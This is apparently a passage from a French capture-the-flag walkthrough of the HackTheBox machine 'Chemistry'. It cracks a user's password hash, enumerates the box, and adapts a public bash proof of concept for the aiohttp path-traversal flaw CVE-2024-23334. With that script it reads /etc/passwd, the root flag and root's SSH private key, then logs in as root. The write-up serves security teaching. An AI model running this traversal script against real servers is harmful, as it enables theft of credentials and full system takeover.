Hash.Target......: 63ed86ee9f624c7b14f1d4f43dc251a5
Time.Started.....: [date], (1 sec)
Time.Estimated...: [date], (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  7675.0 kH/s (0.13ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2985984/14344385 (20.82%)
Rejected.........: 0/2985984 (0.00%)
Restore.Point....: 2981888/14344385 (20.79%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: unicornn -> unc112886
Hardware.Mon.#01.: Util: 19%

Started: [date]
Stopped: [date]
                                                                                                                       
┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/chemistry]
└─$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force --show
63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
```

#### Crédentiels de Rosa

Le mot de passe est :

**rosa:unicorniosrosados**

### Accès SSH et user.txt

Les identifiants récupérés sont testés directement depuis le shell obtenu.

```bash
su rosa
```

Mot de passe :

```txt
unicorniosrosados
```

L’authentification réussit :

```bash
rosa@chemistry:~$ whoami
rosa
```

Tu disposes maintenant d’un shell en tant que `rosa`.

#### Récupération du flag utilisateur

```bash
cat /home/rosa/user.txt
8acdxxxxxxxxxxxxxxxxxxxxxxxx4479
```

Le flag utilisateur est récupéré avec succès.

La prise de pied est complète.

Tu peux maintenant passer à l’escalade de privilèges.

## Escalade de privilèges

{{< escalade-intro user="rosa" >}}

### Sudo -l

Tu commences toujours par vérifier les droits <code>sudo</code> :


```bash
rosa@chemistry:~$ sudo -l
[sudo] password for rosa: 
Sorry, user rosa may not run sudo on chemistry.
```

Aucun droit sudo n’est accordé à `rosa`.

Cela signifie qu’aucune élévation directe via `sudo` n’est possible.
On peut donc écarter cette piste et poursuivre méthodiquement l’énumération.



### Analyse des Linux capabilities

On poursuit l’énumération avec la recherche des *Linux capabilities* :

```bash
rosa@chemistry:~$ getcap -r / 2>/dev/null
```

Résultat :

```bash
/snap/core20/2379/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Les capabilities identifiées concernent essentiellement des opérations réseau.

- Ce type de configuration est classique.
- Aucune capability ne permet ici une élévation directe vers `root`.

Piste non concluante, continue la recherche.



### Recherche de binaires SUID

On vérifie ensuite les binaires SUID :

```bash
rosa@chemistry:/dev/shm$ python3 suid3num.py
  ___ _   _ _ ___    _____  _ _   _ __  __ 
 / __| | | / |   \  |__ / \| | | | |  \/  |
 \__ \ |_| | | |) |  |_ \ .` | |_| | |\/| |
 |___/\___/|_|___/  |___/_|\_|\___/|_|  |_|  twitter@syed__umar

[#] Finding/Listing all SUID Binaries ..
------------------------------
/snap/snapd/21759/usr/lib/snapd/snap-confine
/snap/core20/2379/usr/bin/chfn
/snap/core20/2379/usr/bin/chsh
/snap/core20/2379/usr/bin/gpasswd
/snap/core20/2379/usr/bin/mount
/snap/core20/2379/usr/bin/newgrp
/snap/core20/2379/usr/bin/passwd
/snap/core20/2379/usr/bin/su
/snap/core20/2379/usr/bin/sudo
/snap/core20/2379/usr/bin/umount
/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2379/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/at
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
------------------------------


[!] Default Binaries (Don't bother)
------------------------------
/snap/snapd/21759/usr/lib/snapd/snap-confine
/snap/core20/2379/usr/bin/chfn
/snap/core20/2379/usr/bin/chsh
/snap/core20/2379/usr/bin/gpasswd
/snap/core20/2379/usr/bin/mount
/snap/core20/2379/usr/bin/newgrp
/snap/core20/2379/usr/bin/passwd
/snap/core20/2379/usr/bin/su
/snap/core20/2379/usr/bin/sudo
/snap/core20/2379/usr/bin/umount
/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2379/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/at
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
------------------------------


[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
------------------------------


[#] SUID Binaries found in GTFO bins..
------------------------------
[!] None :(
------------------------------

```

Les binaires identifiés sont standards :

- `sudo`
- `su`
- `passwd`
- `mount`
- `umount`
- `at`
- `gpasswd`
- composants liés à `snap`, `dbus`, `polkit`

Rien d’inhabituel.
Aucun binaire manifestement exploitable via GTFOBins.

Rien d’exploitable à ce stade.

### Analyse des services en écoute

Tu vérifies ensuite les services actifs :

```bash
rosa@chemistry:/dev/shm$ ss -tulpn
Netid      State       Recv-Q      Send-Q           Local Address:Port             Peer Address:Port      Process      
udp        UNCONN      0           0                127.0.0.53%lo:53                    0.0.0.0:*                      
udp        UNCONN      0           0                      0.0.0.0:68                    0.0.0.0:*                      
tcp        LISTEN      0           128                    0.0.0.0:5000                  0.0.0.0:*                      
tcp        LISTEN      0           128                  127.0.0.1:8080                  0.0.0.0:*                      
tcp        LISTEN      0           4096             127.0.0.53%lo:53                    0.0.0.0:*                      
tcp        LISTEN      0           128                    0.0.0.0:22                    0.0.0.0:*                      
tcp        LISTEN      0           128                       [::]:22                       [::]:*                      
rosa@chemistry:/dev/shm$
```

On observe plusieurs services en écoute :

- `0.0.0.0:22` → SSH (classique)
- `0.0.0.0:5000` → application web **Chemistry CIF Analyzer**, déjà exploitée
- `127.0.0.1:8080` → service accessible uniquement en local

Le port 5000 correspond à l’application web initiale et ne constitue pas une nouvelle piste d’escalade.

En revanche, **le service en 127.0.0.1:8080 est uniquement accessible depuis la machine elle-même**.
Il n’était pas visible lors des scans externes.

Dans le cadre d’une escalade de privilèges, c’est donc **la seule surface d’attaque réellement nouvelle à analyser**.

**C’est ici que l’escalade commence réellement.**

> Note : ne confonds pas les deux applications web.
> - Le service exposé sur le port 5000 (Chemistry CIF Analyzer) sert ses fichiers statiques via `/static/`.
> - Le service interne sur 127.0.0.1:8080 sert ses fichiers statiques via `/assets/`.


### Analyse du service interne (127.0.0.1:8080)

Le port **8080** fait immédiatement penser à un service HTTP alternatif.

Pour le vérifier, tu peux récupérer uniquement les en-têtes HTTP :

```
rosa@chemistry:~$ curl -I http://127.0.0.1:8080
```

Réponse :

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Tue, 24 Feb 2026 15:17:38 GMT
Server: Python/3.9 aiohttp/3.9.1
```

Le code `HTTP/1.1 200 OK` confirme qu’il s’agit bien d’un service HTTP.
L’en-tête `Server` indique qu’il tourne sous **Python 3.9 avec aiohttp 3.9.1**.

Nous avons donc affaire à une application web interne développée en Python.

Dans un contexte CTF, un service interne en Python accessible uniquement en local constitue une piste sérieuse d’escalade.

Identifier une version précise d’un framework web Python est ici un signal fort.

L’identification de la version aiohttp ouvre immédiatement la voie à la recherche de vulnérabilités connues.

Une recherche ciblée associant *aiohttp 3.9.1* et *path traversal* met rapidement en évidence une vulnérabilité critique :

CVE-2024-23334 — vulnérabilité de type path traversal affectant la gestion des fichiers statiques dans certaines configurations aiohttp.

Cette faille permet, sous certaines conditions, d’accéder à des fichiers en dehors du répertoire statique exposé par l’application.

Autrement dit :
 si le service expose un dossier comme `/static/` ou `/assets/`, il peut être possible de remonter l’arborescence avec `../` pour lire des fichiers sensibles.

#### Adaptation du PoC à la machine Chemistry

Un PoC public est disponible [ici](https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh).

Le script d’origine cible :

- http://localhost:8081
- le chemin `/static/`

Or, sur la machine Chemistry :

- le service écoute sur `127.0.0.1:8080`
- les fichiers statiques sont servis depuis `/assets/`

Tu le vérifies facilement :

```
rosa@chemistry:~$ curl -s http://127.0.0.1:8080 | grep src
    <script src="/assets/js/jquery-3.6.0.min.js"></script>
    <script src="/assets/js/chart.js"></script>
    <script src="/assets/js/script.js"></script>
```

Cela confirme que le répertoire statique exposé est `/assets/`, et non `/static/`.

Il est donc nécessaire d’adapter le PoC au contexte réel de la machine.

#### Script d’origine

Le script proposé est le suivant :

```
#!/bin/bash

url="http://localhost:8081"
string="../"
payload="/static/"
file="etc/passwd"

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

Le principe est simple :

- ajouter progressivement des `../`
- tester l’accès à un fichier sensible (`/etc/passwd`)
- surveiller le code HTTP
- afficher le contenu dès qu’un `200` apparaît

L’option `--path-as-is` est essentielle :
 elle empêche `curl` de normaliser automatiquement le chemin et garantit que la séquence `../` est envoyée telle quelle au serveur.

#### Script adapté à Chemistry

Tu modifies donc :

- le port → `8080`
- le répertoire statique → `/assets/`

```bash
#!/bin/bash

url="http://127.0.0.1:8080"
string="../"
payload="/assets/"
file="etc/passwd"

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

#### Validation de la vulnérabilité

Exécution :

```bash
rosa@chemistry:~$ bash exploit.sh
[+] Testing with /assets/../etc/passwd
	Status code --> 404
[+] Testing with /assets/../../etc/passwd
	Status code --> 404
[+] Testing with /assets/../../../etc/passwd
	Status code --> 200
```

Puis le contenu de `/etc/passwd` s’affiche.

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

Cela confirme que :

- le service aiohttp interne est vulnérable
- la restriction au répertoire statique peut être contournée
- la machine est vulnérable à un path traversal exploitable

Et surtout :

ce service n’était pas accessible depuis l’extérieur.

Il constitue donc **une surface d’attaque interne révélée uniquement après l’obtention d’un shell utilisateur** — ce qui correspond parfaitement à un scénario d’escalade de privilèges.

### root.txt

#### Lecture directe de root.txt

La vulnérabilité étant confirmée, tu peux cibler directement des fichiers sensibles.

Dans un contexte CTF, le premier objectif évident est :

`/root/root.txt`

Tu modifies simplement la variable cible dans le script :

```bash
file="root/root.txt"
```

Puis tu relances l’exploit :

```bash
bash exploit.sh
[+] Testing with /assets/../root/root.txt
	Status code --> 404
[+] Testing with /assets/../../root/root.txt
	Status code --> 404
[+] Testing with /assets/../../../root/root.txt
	Status code --> 200
7badxxxxxxxxxxxxxxxxxxxxxxxxba4c
```

La lecture du flag root.txt confirme que :

- le path traversal permet d’accéder à des fichiers appartenant à root
- aucune restriction supplémentaire n’est appliquée côté serveur
- la vulnérabilité impacte l’ensemble du système de fichiers

Cependant, lire un fichier ne signifie pas encore disposer d’un shell root interactif. Tu as accès aux données, mais pas encore au contrôle complet du système.

Dans une logique d’escalade complète, il est préférable d’obtenir un accès interactif root.

Une cible naturelle est donc :

`/root/.ssh/id_rsa`

Tu modifies à nouveau la variable :

```bash
file="root/.ssh/id_rsa"
```

Exécution :

```bash
bash exploit.sh
[+] Testing with /assets/../../../root/.ssh/id_rsa
	Status code --> 200
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

Cela signifie que :

- la clé privée SSH de root est lisible
- la protection du dossier /root est totalement contournée
- l’escalade peut désormais devenir interactive

Tu récupères la clé sur ta machine Kali à l’aide de la recette {{< recette "copier-fichiers-kali" >}}, puis tu la sauvegardes dans un fichier local.

Tu adaptes les permissions de la clé :

```bash
chmod 600 id_rsa
```

Puis tu établis une connexion SSH :

```bash
ssh -i id_rsa root@chemistry.htb
```

Connexion réussie.

```bash
root@chemistry:~# whoami
root
root@chemistry:~# pwd
/root
root@chemistry:~# ls -l
total 4
-rw-r----- 1 root root 33 Feb 24 14:37 root.txt
root@chemistry:~# cat root.txt
7badxxxxxxxxxxxxxxxxxxxxxxxxba4c
```

À ce stade :

- tu disposes d’un accès root complet
- tu peux interagir librement avec le système
- l’escalade de privilèges est terminée

**La vulnérabilité CVE-2024-23334, combinée à l’accès utilisateur initial, a donc permis une compromission totale de la machine. Une simple vulnérabilité de path traversal sur un service interne mal isolé suffit ici à compromettre entièrement le système.**

Dans un environnement réel, un service interne mal configuré exposant un répertoire statique peut devenir un vecteur critique d’escalade, même sans accès réseau externe.

## Conclusion

La machine **Chemistry** illustre parfaitement comment une vulnérabilité applicative peut servir de point d’entrée vers une compromission complète du système.

Tout commence par une **Remote Code Execution via upload de fichier CIF (CVE-2024-23346)** exploitant la bibliothèque Python *pymatgen*.

Cette première faille permet d’obtenir un reverse shell et un accès utilisateur limité.

Mais l’élément déterminant réside ensuite dans l’analyse méthodique du système :

l’identification d’un service interne exposé uniquement en local, basé sur **aiohttp 3.9.1**, conduit à l’exploitation d’une seconde vulnérabilité critique — **CVE-2024-23334**, une faille de type path traversal.

Cette combinaison de faiblesses montre une réalité importante en sécurité offensive :

- une RCE initiale ne suffit pas toujours à compromettre totalement une machine,
- mais une mauvaise isolation des services internes peut transformer une simple lecture de fichier en **compromission root complète**.

Chemistry n’est donc pas seulement un exercice d’exploitation technique ;
 c’est un excellent rappel qu’en pentest comme en CTF, la clé reste toujours la même :

> énumérer méthodiquement, comprendre l’architecture, puis exploiter intelligemment les points faibles identifiés.

Tu disposes maintenant d’une vue complète du cycle d’attaque :
RCE → reverse shell → pivot utilisateur → exploitation d’un service interne → accès root.

Ce type d’enchaînement de vulnérabilités — RCE initiale puis exploitation d’un service interne mal isolé — reflète des erreurs que l’on retrouve régulièrement en environnement réel.

## Ce que tu dois retenir

La machine Chemistry n’est pas seulement une suite d’exploits techniques.  
Elle montre surtout comment raisonner proprement après chaque étape et comment transformer un accès limité en compromission complète.

- Une vulnérabilité critique comme une RCE ne donne pas toujours immédiatement un accès root : elle ouvre une porte, à toi d’explorer le reste.
- Après un premier accès, concentre-toi sur l’énumération locale : les services internes sont souvent plus vulnérables que l’application exposée publiquement.
- Un simple path traversal peut devenir critique s’il permet de lire des fichiers sensibles comme des clés SSH.
- Ne saute jamais directement sur un exploit trouvé en ligne : comprendre l’architecture et les composants utilisés te donne souvent la meilleure piste d’escalade.
- En CTF comme en environnement réel, la rigueur, la méthode et l’analyse font toute la différence.

## Pièces jointes

- <a href="files/poc-ping.cif" download>poc-ping.cif</a>
- <a href="files/revshell.cif" download>revshell.cif</a>

{{< feedback >}}
